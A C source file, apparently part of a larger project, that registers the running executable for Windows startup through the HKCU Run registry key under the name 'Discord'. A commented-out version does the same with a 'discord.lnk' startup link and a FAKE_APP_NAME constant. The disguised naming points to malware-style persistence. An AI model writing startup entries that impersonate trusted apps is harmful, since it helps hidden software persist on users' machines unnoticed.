//#include <stdio.h>
//
//
//void addProgramToStartup()
//{
//    // /*
//    // Adds the program to the windows startup folder
//    // (All the programs on this folder are auto runned on every boot)
//    // */
//
//    // //TODO: Runs the func command as administrator
//
//    // FILE *fp;
//    // TCHAR buffer[MAX_PATH] = {0};
//    // const char LINK_PATH[100] = "\"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\discord.lnk\""; //TODO: check if the path changes between pc to pc
//    // char command[1024] = "mklink";
//
//    // // If we have already added the file to the startup programs folder
//    // fp = fopen(LINK_PATH, "r");
//    // if (fp)
//    // {
//    //     // We will end the func
//    //     fclose(fp);
//    //     return;
//    // }
//
//    // // Adds the link path to the command (where the link file will be save)
//    // strcat(command, " ");
//    // strcat(command, LINK_PATH);
//    // strcat(command, " ");
//
//    // // Gets the path of the current file
//    // GetModuleFileName(NULL, buffer, MAX_PATH);
//
//    // // Adds the path to the target file to the command(the file which the link will open)
//    // strcat(command, "\"");   // The path looks like this -> "path" so we have to add -> " at the start and at the end of the path
//    // strcat(command, buffer); // Adds the path
//    // strcat(command, "\"");   // Adds -> " to the end of the path
//
//    // system(command); // Executes the command
//
//    // This method not requires administrator agreement (Using registery)  (https://www.youtube.com/watch?v=r7vjqN4_Lv0)
//    char re[MAX_PATH];
//    GetModuleFileNameA(NULL, re, sizeof(re));
//
//    HKEY hkey;
//    LONG key = RegOpenKeyEx(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\Currentversion\\Run", 0, KEY_WRITE, &hkey);
//    if (ERROR_SUCCESS == key)
//    {
//        key = RegSetValueEx(hkey, FAKE_APP_NAME, 0, REG_SZ, (BYTE*)re, strlen(re));
//    }
//}






#include <Windows.h>


BOOL IsMyProgramRegisteredForStartup(PCWSTR pszAppName)
{
    HKEY hKey = NULL;
    LONG lResult = 0;
    BOOL fSuccess = TRUE;
    DWORD dwRegType = REG_SZ;
    wchar_t szPathToExe[MAX_PATH] = { 0 };
    DWORD dwSize = sizeof(szPathToExe);

    lResult = RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_READ, &hKey);

    fSuccess = (lResult == 0);

    if (fSuccess)
    {
        lResult = RegGetValueW(hKey, NULL, pszAppName, RRF_RT_REG_SZ, &dwRegType, szPathToExe, &dwSize);
        fSuccess = (lResult == 0);
    }

    if (fSuccess)
    {
        fSuccess = (wcslen(szPathToExe) > 0) ? TRUE : FALSE;
    }

    if (hKey != NULL)
    {
        RegCloseKey(hKey);
        hKey = NULL;
    }

    return fSuccess;
}

BOOL RegisterMyProgramForStartup(PCWSTR pszAppName, PCWSTR pathToExe, PCWSTR args)
{
    HKEY hKey = NULL;
    LONG lResult = 0;
    BOOL fSuccess = TRUE;
    DWORD dwSize;

    const size_t count = MAX_PATH * 2;
    wchar_t szValue[MAX_PATH * 2] = { 0 };


    wcscpy_s(szValue, count, L"\"");
    wcscat_s(szValue, count, pathToExe);
    wcscat_s(szValue, count, L"\" ");

    if (args != NULL)
    {
        // caller should make sure "args" is quoted if any single argument has a space
        // e.g. (L"-name \"Mark Voidale\"");
        wcscat_s(szValue, count, args);
    }

    lResult = RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, (KEY_WRITE | KEY_READ), NULL, &hKey, NULL);

    fSuccess = (lResult == 0);

    if (fSuccess)
    {
        dwSize = (wcslen(szValue) + 1) * 2;
        lResult = RegSetValueExW(hKey, pszAppName, 0, REG_SZ, (BYTE*)szValue, dwSize);
        fSuccess = (lResult == 0);
    }

    if (hKey != NULL)
    {
        RegCloseKey(hKey);
        hKey = NULL;
    }

    return fSuccess;
}

void RegisterProgram()
{
    wchar_t szPathToExe[MAX_PATH];

    GetModuleFileNameW(NULL, szPathToExe, MAX_PATH);
    //RegisterMyProgramForStartup(L"My_Program", szPathToExe, L"-foobar");
    RegisterMyProgramForStartup(L"Discord", szPathToExe, NULL);

    //IsMyProgramRegisteredForStartup(L"My_Program");
}
    